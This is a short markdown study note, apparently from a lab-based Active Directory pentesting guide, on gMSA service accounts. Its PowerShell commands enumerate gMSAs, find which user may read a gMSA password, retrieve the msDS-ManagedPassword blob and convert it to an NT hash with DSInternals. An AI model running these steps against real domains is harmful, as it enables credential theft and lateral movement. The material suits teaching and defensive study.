# gMSA

A gMSA is a domain account that can be used to run services on multiple servers without having to manage the password. Users may have the right to read gMSA passwords in the domain.

The NT hash of the gMSA's password is stored in the attribute `msDS-ManagedPassword` of the principal.



## Enumerate gMSA

```powershell
> Get-ADServiceAccount -Filter *

DistinguishedName : CN=jumpone,CN=Managed Service Accounts,DC=us,DC=techcorp,DC=local
Enabled           : True
Name              : jumpone
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : 1ac6c58e-e81d-48a8-bc42-c768d0180603
SamAccountName    : jumpone$
SID               : S-1-5-21-210670787-2521448726-163245708-8601
UserPrincipalName :
```

## List users that can read gMSA passwords

```powershell
> Get-ADServiceAccount -Identity jumpone -Properties * | select -expand PrincipalsAllowedToRetrieveManagedPassword
CN=provisioning svc,CN=Users,DC=us,DC=techcorp,DC=local
```

This means that the user `provisioningsvc` is allowed to read the password of gMSA `jumpone`.

## Read the gMSA password

First, open a session as the `provisioningsvc` user, cf. [#authenticate-with-a-key](../misc/ad-authentication.md#authenticate-with-a-key "mention").

Then, retrieve the password blob:

```powershell
> $PasswordBlob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```

Then, decode the password blob with DSInternals:

```powershell
> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $PasswordBlob
> ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword
```

